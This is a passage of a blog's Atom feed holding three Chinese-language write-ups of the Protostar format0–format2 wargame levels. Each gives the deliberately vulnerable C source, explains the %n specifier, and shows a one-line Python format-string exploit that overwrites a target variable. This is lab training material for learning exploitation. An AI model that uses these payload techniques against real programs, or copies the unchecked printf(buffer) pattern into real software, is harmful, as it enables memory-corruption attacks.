    <id>http://yoursite.com/2018/09/12/Protostar-format2/</id>
    <published>2018-09-12T09:07:58.000Z</published>
    <updated>2018-09-12T10:11:56.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format2"><a href="#Format2" class="headerlink" title="Format2"></a>Format2</h1><p>与Format1异曲同工</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Format2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">buffer</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">64</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"target is %d :(\n"</span>, target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="查找”target“"><a href="#查找”target“" class="headerlink" title="查找”target“"></a>查找”target“</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ objdump -t format2 | grep target</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format2_1.jpg" data-fancybox="group" data-caption="format2_1" class="fancybox"><img alt="format2_1" title="format2_1" data-src="https://dblu3.github.io/img/Protostar/format2_1.jpg" class="lazyload"></a></p><h2 id="定位target的注入位置"><a href="#定位target的注入位置" class="headerlink" title="定位target的注入位置"></a>定位target的注入位置</h2><p><a href="https://dblu3.github.io/img/Protostar/format2_2.jpg" data-fancybox="group" data-caption="format2_2" class="fancybox"><img alt="format2_2" title="format2_2" data-src="https://dblu3.github.io/img/Protostar/format2_2.jpg" class="lazyload"></a><br>定位了偏移量之后，我们把最后一个%x改成%n，发现程序输出了target的值</p><p>因为要使<code>(target == 64)</code></p><p>所以我们把其中一个%x固定长度，使target = 64就OK了</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$  python -c &#39;print &quot;AAAA&quot; + &quot;\xe4\x96\x04\x08&quot; + “%29x” + &quot;%x &quot;*3 + &quot;%n &quot;&#39; | .&#x2F;format2</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format2_3.jpg" data-fancybox="group" data-caption="format2_3" class="fancybox"><img alt="format2_3" title="format2_3" data-src="https://dblu3.github.io/img/Protostar/format2_3.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Format2&quot;&gt;&lt;a href=&quot;#Format2&quot; class=&quot;headerlink&quot; title=&quot;Format2&quot;&gt;&lt;/a&gt;Format2&lt;/h1&gt;&lt;p&gt;与Format1异曲同工&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_format1</title>
    <link href="http://yoursite.com/2018/09/11/Protostar-format1/"/>
    <id>http://yoursite.com/2018/09/11/Protostar-format1/</id>
    <published>2018-09-11T07:07:37.000Z</published>
    <updated>2018-09-11T09:31:52.466Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format1"><a href="#Format1" class="headerlink" title="Format1"></a>Format1</h1><p>这题主要是利用“%n”</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Format1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><ul><li>objdump -t is your friend, and your input string lies far up the stack :)</li></ul><h2 id="关于“-n”"><a href="#关于“-n”" class="headerlink" title="关于“%n”"></a>关于“%n”</h2><p>C语言中，%n是将输出字符串的长度赋值给一个变量，这里给出一个例子</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> test;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fat cat%n"</span>, &amp;test);</span><br><span class="line"><span class="meta"># result：7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="简单运行一下"><a href="#简单运行一下" class="headerlink" title="简单运行一下"></a>简单运行一下</h2><p><a href="https://dblu3.github.io/img/Protostar/format1_1.jpg" data-fancybox="group" data-caption="format1_1" class="fancybox"><img alt="format1_1" title="format1_1" data-src="https://dblu3.github.io/img/Protostar/format1_1.jpg" class="lazyload"></a><br>发现我们输入的数值都被打印出来了</p><h2 id="查看程序的符号表"><a href="#查看程序的符号表" class="headerlink" title="查看程序的符号表"></a>查看程序的符号表</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ objdump -t format1</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format1_2.jpg" data-fancybox="group" data-caption="format1_2" class="fancybox"><img alt="format1_2" title="format1_2" data-src="https://dblu3.github.io/img/Protostar/format1_2.jpg" class="lazyload"></a></p><p>发现target</p><p>那么我们可以通过控制输入的变量，把内存的值改为target的地址</p><p>可是我们怎么知道输入的EXP里面，target的地址应该放在哪里呢？</p><p>简单地测试一下吧</p><p><a href="https://dblu3.github.io/img/Protostar/format1_3.jpg" data-fancybox="group" data-caption="format1_3" class="fancybox"><img alt="format1_3" title="format1_3" data-src="https://dblu3.github.io/img/Protostar/format1_3.jpg" class="lazyload"></a><br>可以发现我们输入的‘A’(0x41)</p><p>再继续尝试一下，调整位置</p><p>多次尝试后终于找到合适的位置<br><a href="https://dblu3.github.io/img/Protostar/format1_4.jpg" data-fancybox="group" data-caption="format1_4" class="fancybox"><img alt="format1_4" title="format1_4" data-src="https://dblu3.github.io/img/Protostar/format1_4.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>接下来就简单了，把最后一个%x改成%n就可以了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ .&#x2F;format1 &quot;&#96; python -c &quot;print &#39;AAAA&#39;*10 + &#39;\x38\x96\x04\x08&#39; + &#39;BBBBB&#39; + &#39;%x &#39;*137 + &#39;%n &#39;&quot; &#96;&quot;</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format1_5.jpg" data-fancybox="group" data-caption="format1_5" class="fancybox"><img alt="format1_5" title="format1_5" data-src="https://dblu3.github.io/img/Protostar/format1_5.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Format1&quot;&gt;&lt;a href=&quot;#Format1&quot; class=&quot;headerlink&quot; title=&quot;Format1&quot;&gt;&lt;/a&gt;Format1&lt;/h1&gt;&lt;p&gt;这题主要是利用“%n”&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_format0</title>
    <link href="http://yoursite.com/2018/09/10/Protostar-format0/"/>
    <id>http://yoursite.com/2018/09/10/Protostar-format0/</id>
    <published>2018-09-10T14:08:19.000Z</published>
    <updated>2018-09-11T08:07:08.692Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format0"><a href="#Format0" class="headerlink" title="Format0"></a>Format0</h1><p>简单的溢出</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Format0</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> target;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(<span class="built_in">buffer</span>, <span class="built_in">string</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have hit the target correctly :)\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><ul><li>This level should be done in less than 10 bytes of input.</li><li>“Exploiting format string vulnerabilities”</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>很简单，直接利用溢出就行了<br><a href="https://dblu3.github.io/img/Protostar/format0_1.jpg" data-fancybox="group" data-caption="format0_1" class="fancybox"><img alt="format0_1" title="format0_1" data-src="https://dblu3.github.io/img/Protostar/format0_1.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Format0&quot;&gt;&lt;a href=&quot;#Format0&quot; class=&quot;headerlink&quot; title=&quot;Format0&quot;&gt;&lt;/a&gt;Format0&lt;/h1&gt;&lt;p&gt;简单的溢出&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
</feed>
